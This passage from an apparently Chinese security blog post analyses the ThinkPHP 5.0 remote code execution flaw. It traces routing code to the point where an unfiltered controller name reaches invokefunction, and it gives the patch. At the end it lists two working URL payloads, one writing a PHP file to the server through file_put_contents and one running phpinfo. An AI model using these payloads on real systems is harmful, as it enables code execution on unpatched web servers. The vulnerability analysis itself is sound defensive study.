<p>Config::get(‘var_pathinfo’)是配置文件中的设置的参数，默认值为s，从GET中获取键值，然后赋值给routeCheck中的$path<br>我们再回到App.php 行数:606<br>这里会进行路由检测，检查$check后会进入else分支导入路由配置，接着检测路由url调度结果为$result，如果调度失败且开启了强制路由$must，则报出路由无效，接着进入Route::parseUrl函数，根据$path（自定义url）解析操作<br>开始跟踪parseUrl函数<br>/thinkphp/library/think/Route.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n0gfx7zkj30vj0j9ju1.jpg" alt=""><br>进入parseUrlPath函数<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n0hzlw24j30g50fhq49.jpg" alt=""><br>对模块/控制器/操作的url地址分割成数组来返回<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n0nnbj4ij30xj0hqmzn.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n0zo2m15j30r10e9gnb.jpg" alt=""><br>回到parseurl(),我们可以看到，返回的结果赋值为$path,提取路由信息又封装到$route,<br>最后返回,回到App.php<br>在app.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n13akbkxj30ra0hpjt9.jpg" alt=""><br>找到self::exec()<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n15p5a4rj30lb0hvjte.jpg" alt=""><br>我们可以看到模块/控制器/操作 的函数为self::module<br>开始跟踪module函数<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n16v6mhqj30r30i8myy.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n19ne3aqj30s90h5myu.jpg" alt=""><br>我们可以看到，根据$config[‘app_multi_module’]进入多模块部署，$bind为NULL，又进入elseif分支，判断模块是否在禁止的列表里面$config[‘deny_module_list’]，而且mmodule存在，$available = true，就不会抛出异常<br>module函数最后的返回值，发现$controller没有进行过滤，那么此时应该为think<code>\</code>app，也就是return self::invokeMethod($call, $vars);<br>找到invokeMethod()<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n1av6qjwj30wa0akq41.jpg" alt=""><br>此时穿进去的$call也就是$method,是一个数组，第一个元素是一个think\App对象，第二个元素则是调用方法名称的字符串invokefunction，然后通过反射ReflectionMethod获取这个对象下对应的方法<br>再通过函数$args = self::bindParams($reflect, $vars);获取传入的参数，也就是payload</p>
<p>最后再调用反射$reflect-&gt;invokeArgs($args);，将Payload数组传入反射对象函数invokeFunction，完成代码执行。<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n1fs4atzj30nd069dg9.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1n1j2g79yj30p30ft3ze.jpg" alt=""></p>
<p>在攻击时注意使用一个已存在的module，否则会报错 模块不存在<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1m2zlh5wyj30lx09b3z9.jpg" alt=""></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1m31aqg68j30lz0810ti.jpg" alt=""><br>此处在获取控制器名时直接从之前的解析结果中获取，无任何安全检查。<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1m33n1mqyj30nn094mxv.jpg" alt=""><br>这里对控制器类进行实例化<br>接着在 <code>thinkphp/library/think/Loader.php</code>：454 找到controller 方法<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1m367b9n3j30q40aq0tu.jpg" alt=""><br>根据传入的name获取对应的类，如果存在就直接返回这个类的一个实例化对象。<br>跟进getModuleAndClass方法：<code>Loader.php : 521 行</code><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1m38iewqcj30m20bvq3w.jpg" alt=""><br>如果控制器名中有<code>\</code>，就直接返回。<br>回到thinkphp/library/think/App.php的module方法，<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1m3fqsimfj30m60ctdgw.jpg" alt=""><br>正常情况下应该获取到对应控制器类的实例化对象，而我们现在得到了一个<code>\think\App</code>的实例化对象，进而通过url调用其任意的public方法，同时解析url中的额外参数，当作方法的参数传入。</p>
<h1 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h1><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>在thinkphp5.0版本的thinkphp/library/think/App.php554行，thinkphp5.1版本的thinkphp/library/think/route/dispatch/Url.php63行添加如下代码进行过滤：<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (!preg_match('/^[<span class="string">A-Za-z</span>](<span class="link">\w|\.</span>)*$/', $controller)) &#123;</span><br><span class="line"><span class="code">    throw new HttpException(404, 'controller not exists:' . $controller);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1m3jdum1vj30la02z74d.jpg" alt=""></p>
<p>payload:<br>/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=1.php&amp;vars[1][]=&lt;?php phpinfo();?&gt;</p>
<p>s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://paper.seebug.org/770/" target="_blank" rel="noopener">https://paper.seebug.org/770/</a><br><a href="http://www.lmxspace.com/2018/12/12/Thinkphp-5-0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">http://www.lmxspace.com/2018/12/12/Thinkphp-5-0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a><br><a href="https://blog.51cto.com/superwolf/2338829" target="_blank" rel="noopener">https://blog.51cto.com/superwolf/2338829</a><br><a href="https://www.kancloud.cn/zmwtp/tp5/120709" target="_blank" rel="noopener">https://www.kancloud.cn/zmwtp/tp5/120709</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/03/31/Thinkphp-5-0远程代码执行漏洞/" data-id="cjvrp4gj0000y5gqr1w0qlp5t" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web安全/">web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/日记/">日记</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSH/">SSH</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/">c++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web安全/">web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/开发/">开发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/日记/">日记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/汇编/">汇编</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/爬虫/">爬虫</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/SSH/" style="font-size: 10px;">SSH</a> <a href="/tags/c/" style="font-size: 10px;">c++</a> <a href="/tags/web安全/" style="font-size: 15px;">web安全</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/代码审计/" style="font-size: 12.5px;">代码审计</a> <a href="/tags/开发/" style="font-size: 17.5px;">开发</a> <a href="/tags/日记/" style="font-size: 10px;">日记</a> <a href="/tags/汇编/" style="font-size: 10px;">汇编</a> <a href="/tags/爬虫/" style="font-size: 10px;">爬虫</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2019/05/17/网易云音乐免费下载/">网易云音乐免费下载</a>
          </li>
        
          <li>
            <a href="/2019/05/11/linux学习笔记/">linux学习笔记</a>
          </li>
        
          <li>
            <a href="/2019/05/11/docker学习/">docker学习</a>
          </li>
        
          <li>
            <a href="/2019/05/08/test/">test</a>
          </li>
        
          <li>
            <a href="/2019/04/19/PHP-sprintf格式化字符串漏洞/">PHP sprintf格式化字符串漏洞</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2019 筱阳<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>